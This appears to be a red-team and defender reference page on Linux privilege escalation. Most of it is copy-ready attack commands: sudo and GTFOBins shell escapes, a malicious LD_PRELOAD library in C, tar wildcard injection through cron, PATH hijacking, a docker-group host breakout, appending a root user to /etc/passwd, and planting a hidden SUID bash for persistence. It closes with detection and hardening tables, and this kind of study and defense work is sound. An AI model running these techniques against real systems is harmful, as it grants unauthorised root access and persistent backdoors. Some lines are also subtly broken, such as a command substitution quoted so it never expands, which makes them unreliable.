Linux Privilege Escalation

Category: Unix/Linux Security, Exploitation, Red Team
Parent: os/Unix-Linux/README.md

Overview

Linux privilege escalation is the process of going from a lower-privilege foothold to a higher-privilege level — typically from a regular user to root, or from a container to the host. Understanding every escalation path is essential for both attackers (to understand what a compromised service can reach) and defenders (to close the paths before exploitation).

This document covers the complete local privilege escalation playbook used in real-world engagements — every technique, how to detect it, and how to prevent it.

Enumeration First: Finding the Attack Surface

Before trying any specific technique, enumerate the system:

# Who am I and what groups do I belong to?
id
whoami
groups

# What can I run as sudo?
sudo -l

# SUID/SGID binaries (world-executable with elevated privilege)
find / -perm -4000 -type f 2>/dev/null   # SUID
find / -perm -2000 -type f 2>/dev/null   # SGID
find / -perm -6000 -type f 2>/dev/null   # Both

# World-writable directories and files
find / -writable -type d 2>/dev/null
find / -writable -type f -not -path "/proc/*" 2>/dev/null

# Capabilities on binaries
getcap -r / 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l  # current user's crontab

# Running services and their users
ps aux
systemctl list-units --type=service --state=running

# Listening services
ss -tlnp
netstat -tlnp

# Kernel version (check for known CVEs)
uname -r
uname -a
cat /proc/version

# Installed software versions
dpkg -l     # Debian/Ubuntu
rpm -qa     # RHEL/CentOS

# Environment variables
env
cat /etc/environment

# PATH
echo $PATH

# NFS shares
cat /etc/exports
showmount -e localhost

Technique 1: Sudo Misconfigurations

sudo allows specific users to run commands as root. Misconfigurations are the most common local privilege escalation vector.

NOPASSWD Entries

# sudo -l output showing NOPASSWD
User alice may run the following commands on host:
    (root) NOPASSWD: /usr/bin/vim

If vim can be run as root without password, drop to root shell:

sudo vim -c ':!/bin/bash'
# or
sudo vim /etc/sudoers  # edit directly

GTFOBins — Common Sudo Escalation Binaries

Visit gtfobins.github.io for the full list. Key examples:

| Binary | Escalation command |
| ------------ | -------------------------------------------------------------------- | ------------------------- |
| vim | sudo vim -c ':!/bin/bash' |
| less | sudo less /etc/hosts → type !/bin/bash |
| find | sudo find / -exec /bin/bash \; |
| awk | sudo awk 'BEGIN {system("/bin/bash")}' |
| python3 | sudo python3 -c 'import os; os.system("/bin/bash")' |
| perl | sudo perl -e 'exec "/bin/bash";' |
| nmap (old) | sudo nmap --interactive → !sh |
| man | sudo man ls → type !/bin/bash |
| cp | sudo cp /bin/bash /tmp/bash; sudo chmod +s /tmp/bash; /tmp/bash -p |
| tee | echo "alice ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers |

Sudo Environment Variable Attacks

# LD_PRELOAD injection via sudo (if env_keep includes LD_PRELOAD)
# sudo -l shows: env_keep += LD_PRELOAD

# Create a malicious shared library
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
void __attribute__((constructor)) init() {
    setuid(0); setgid(0);
    system("/bin/bash -i");
}
EOF
gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c
sudo LD_PRELOAD=/tmp/evil.so <any-allowed-command>

Sudo PATH Hijacking

If sudo preserves the user's PATH and a sudo-allowed script calls relative paths:

# Script called via sudo uses 'cat' without full path
# Attacker creates /tmp/cat and prepends /tmp to PATH
echo "/bin/bash" > /tmp/cat
chmod +x /tmp/cat
sudo PATH=/tmp:$PATH /usr/local/bin/vulnerable-script.sh

Technique 2: SUID/SGID Binaries

SUID (Set User ID) means the binary runs as the file owner (often root), regardless of who executes it. SGID runs as the file's group.

# Find all SUID root binaries
find / -perm -4000 -user root -type f 2>/dev/null

# Expected legitimate SUID binaries (do not modify these)
# /usr/bin/passwd, /usr/bin/sudo, /usr/bin/su, /bin/ping (on older systems)

Unexpected SUID Binaries = Privesc Path

If a shell, editor, or scripting language has the SUID bit set:

# SUID bash
/bin/bash -p      # -p flag honors SUID; gives effective UID = owner (root)

# SUID python3
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# SUID nmap (old versions had --interactive)
nmap --interactive  # then: !sh

# Custom SUID binary with system() call (common in CTFs)
strings ./suid_binary | grep "/bin"   # find what it calls
ltrace ./suid_binary                  # trace library calls
strace ./suid_binary                  # trace syscalls

Creating a SUID Root Shell (Post-Exploitation)

After gaining temporary root access (e.g., via kernel exploit):

cp /bin/bash /tmp/.hidden_bash
chmod +s /tmp/.hidden_bash
# Later, as normal user:
/tmp/.hidden_bash -p    # euid=root

Technique 3: Cron Job Exploitation

Cron jobs run commands on a schedule, often as root. If a cron job calls a script or binary that a non-root user can modify, privilege escalation is trivial.

Wildcards in Cron

# /etc/crontab contains:
* * * * * root tar -zcf /var/backup.tgz /home/*

# The * in /home/* is expanded by the shell
# Create files with flag names to inject tar options:
touch /home/'--checkpoint=1'
touch /home/'--checkpoint-action=exec=sh privesc.sh'
# When tar runs, it will execute privesc.sh as root

Writable Script Called by Cron

# Cron calls /opt/cleanup.sh as root
# Check if /opt/cleanup.sh is world-writable
ls -la /opt/cleanup.sh
# -rwxrwxrwx 1 root root /opt/cleanup.sh

# Overwrite it
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /opt/cleanup.sh
# Wait for cron to run, then:
/tmp/bash -p    # root shell

Writable Directory in Cron PATH

# /etc/crontab PATH includes a directory the user can write to
PATH=/home/user/bin:/usr/local/bin:/usr/bin:/bin

# If cron calls 'backup' (relative), and /home/user/bin is writable:
echo '#!/bin/bash\ncp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/bin/backup
chmod +x /home/user/bin/backup

Technique 4: File Capabilities Abuse

# Find binaries with capabilities
getcap -r / 2>/dev/null

# Example dangerous finding:
/usr/bin/python3 = cap_setuid+ep

# Exploit: use python3 to setuid(0)
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Another example:
/usr/bin/vim.basic = cap_setuid+ep
vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh","-c","reset;exec sh")'

# cap_dac_read_search on tar or similar:
/usr/bin/tar = cap_dac_read_search+ep
tar -cvf shadow.tar /etc/shadow 2>/dev/null
tar -xvf shadow.tar
cat etc/shadow   # read shadow without being root

Technique 5: PATH Hijacking

If a SUID binary or a root-run script calls another program using a relative path (without full /usr/bin/ prefix), an attacker who can control PATH can replace the called binary.

# SUID binary calls 'date' without full path
strings /usr/local/bin/suid-binary | grep date
# Output: date  <- relative path!

# Create malicious 'date' in /tmp
echo '#!/bin/bash\nchmod +s /bin/bash' > /tmp/date
chmod +x /tmp/date

# Prepend /tmp to PATH and run the SUID binary
export PATH=/tmp:$PATH
/usr/local/bin/suid-binary

# Now:
/bin/bash -p    # root shell

Technique 6: LD_PRELOAD / LD_LIBRARY_PATH

Shared library injection via dynamic linker environment variables.

# If LD_PRELOAD is preserved for a sudo command (via env_keep):
# OR if a SUID binary loads a library from a world-writable path:

# Write a malicious .so
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
static void __attribute__((constructor)) init() {
    setresuid(0,0,0);
    setresgid(0,0,0);
    system("/bin/bash -i");
}
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/evil.so /tmp/evil.c

# Inject:
sudo LD_PRELOAD=/tmp/evil.so /bin/date

Note: The dynamic linker ignores LD_PRELOAD for SUID binaries unless the library is in a trusted directory — but not all systems enforce this consistently.

Technique 7: NFS Root Squash Disabled

If a server exports NFS shares with no_root_squash, a root user on the client machine maps to root on the server — allowing creation of SUID binaries on the NFS mount.

# Check NFS exports (as unprivileged user on the server)
cat /etc/exports
# /home *(rw,no_root_squash)   <- vulnerable

# From attacker machine (as root — pivot needed):
mount -t nfs <target>:/home /mnt/nfs
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash

# Back on target (as normal user):
/home/bash -p   # root shell

Technique 8: Docker Group Membership

The docker group grants access to the Docker socket, which is equivalent to root on the host.

# Check groups
id
# uid=1001(alice) gid=1001(alice) groups=1001(alice),116(docker)

# Escape via docker run mounting host root
docker run -it -v /:/host ubuntu chroot /host /bin/bash
# Now you are root inside the container, with the host filesystem at /

Technique 9: Writable /etc/passwd or /etc/shadow

If these files are world-writable (misconfiguration):

# Add a new root user to /etc/passwd (no shadow needed if using password hash inline)
echo 'hacker:$(openssl passwd hacked):0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker    # enter password "hacked" → root shell

# If /etc/shadow is writable:
# Replace root's hash with one you know
python3 -c "import crypt; print(crypt.crypt('newpassword'))"
# Manually edit /etc/shadow with the new hash
su root    # enter "newpassword"

Post-Exploitation: Persistence Mechanisms

After gaining root, an attacker establishes persistence:

Technique How Detection
SUID shell backdoor chmod +s /bin/bash FIM (file integrity monitoring) on /bin
SSH authorized_keys Add attacker key to /root/.ssh/authorized_keys Monitor .ssh/authorized_keys for changes
Cron backdoor Add root crontab entry crontab -l; /etc/cron.d monitoring
Systemd service Create malicious unit file in /etc/systemd/system New unit files trigger FIM
LD_PRELOAD in /etc/ld.so.preload Global shared library injection for all processes FIM on /etc/ld.so.preload
Kernel module rootkit insmod evil.ko Module listing; DKMS integrity
Modify sudoers Add ALL=(ALL) NOPASSWD:ALL FIM on /etc/sudoers
Replace system binary Overwrite /usr/bin/sshd with backdoored version Package integrity checks; FIM

Defense: Closing Escalation Paths

Control What it prevents
sudo least privilege — only needed commands Reduces GTFOBins attack surface
Audit SUID/SGID binaries monthly Find unexpected SUID binaries early
Remove SUID from unnecessary binaries: chmod -s Eliminates SUID escalation path
Remove users from docker, wheel, adm groups unless needed Reduces privilege through group membership
FIM (File Integrity Monitoring — AIDE, Tripwire, Osquery) Detects modification of sensitive binaries and configs
AppArmor/SELinux profiles on services Limits what a compromised service can do even as root
Kernel patching cadence Closes CVE windows; prioritize CVSS 7+ kernel bugs
Auditd rules for sensitive file access Logs /etc/passwd, /etc/shadow, /etc/sudoers writes
Seccomp + capabilities drop in services Reduces usable syscalls and privileges
No world-writable files outside /tmp Prevents script injection into root-run processes
/tmp mounted with noexec,nosuid Makes /tmp staging harder

Key Takeaways

  • The most common local privesc vectors are sudo misconfiguration, SUID binaries, writable cron scripts, and docker group membership.
  • GTFOBins documents escalation for nearly every common Unix binary — know the top 20.
  • getcap -r / and find / -perm -4000 are the two most important enumeration commands.
  • Kernel CVEs (PwnKit, Dirty Pipe, Dirty COW) require up-to-date kernel patching; track CVSS 7+ kernel CVEs.
  • Detection relies on FIM, auditd, and EDR — not on blocking every technique individually.
